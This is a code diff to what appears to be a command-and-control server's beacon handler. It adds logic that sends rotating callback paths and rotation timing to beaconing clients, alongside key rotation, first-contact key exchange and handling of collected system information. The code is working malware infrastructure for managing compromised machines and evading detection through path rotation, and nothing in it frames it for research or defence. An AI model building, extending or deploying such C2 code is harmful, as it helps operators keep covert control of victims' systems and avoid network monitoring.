@@ -2,6 +2,7 @@ import logging
 import json
 import base64
 import re
+import time
 import uuid
 import hashlib
 import random
@@ -352,12 +353,34 @@ class BeaconHandler(BaseHandler):
             commands.insert(0, key_rotation_command)
             has_key_operation = True
             self.log_message(f"Requesting key rotation after receiving full system info from {client_id}")
+
+        # Check if we should include path rotation info
+        should_include_rotation = False
         
-        # Add path rotation information if requested
-        if include_rotation_info:
-            rotation_info = self.path_router.get_rotation_info()
-            rotation_command = self.path_router.create_path_rotation_command()
-            commands.append(rotation_command)
+        # Add path rotation information if requested or if client is new
+        if include_rotation_info or is_new_client:
+            # Check if we've sent rotation info recently
+            client_info = self.client_manager.get_clients_info().get(client_id, {})
+            last_rotation_sent = client_info.get("last_rotation_sent", 0)
+            current_time = int(time.time())
+            rotation_id = self.path_router.path_manager.rotation_counter
+            
+            # Only send rotation info if:
+            # 1. Client is new OR
+            # 2. We haven't sent rotation info in the last 5 minutes OR
+            # 3. The rotation ID has changed since we last sent it
+            if (is_new_client or 
+                (current_time - last_rotation_sent > 300) or
+                (client_info.get("last_rotation_id", -1) != rotation_id)):
+                
+                should_include_rotation = True
+                rotation_command = self.path_router.create_path_rotation_command()
+                commands.append(rotation_command)
+                
+                # Update the last rotation info sent timestamp and ID
+                if client_id in self.client_manager.clients:
+                    self.client_manager.clients[client_id]["last_rotation_sent"] = current_time
+                    self.client_manager.clients[client_id]["last_rotation_id"] = rotation_id
         
         # Prepare response with commands and rotation info
         response_data = {
@@ -377,12 +400,13 @@ class BeaconHandler(BaseHandler):
             else:
                 response_data["kr"] = True  # Shortened from "key_rotation"
         
-        # Add rotation info
-        rotation_info = {
-            "cid": self.path_router.path_manager.rotation_counter,       # Shortened from "current_rotation_id"
-            "nrt": self.path_router.path_manager.get_next_rotation_time() # Shortened from "next_rotation_time"
-        }
-        response_data["r"] = rotation_info
+        # Add rotation info only if we determined we should include it
+        if should_include_rotation:
+            rotation_info = {
+                "cid": self.path_router.path_manager.rotation_counter,       # Shortened from "current_rotation_id"
+                "nrt": self.path_router.path_manager.get_next_rotation_time() # Shortened from "next_rotation_time"
+            }
+            response_data["r"] = rotation_info
         
         # Add public key for first contact to enable secure key exchange
         if is_new_client or not client_id:
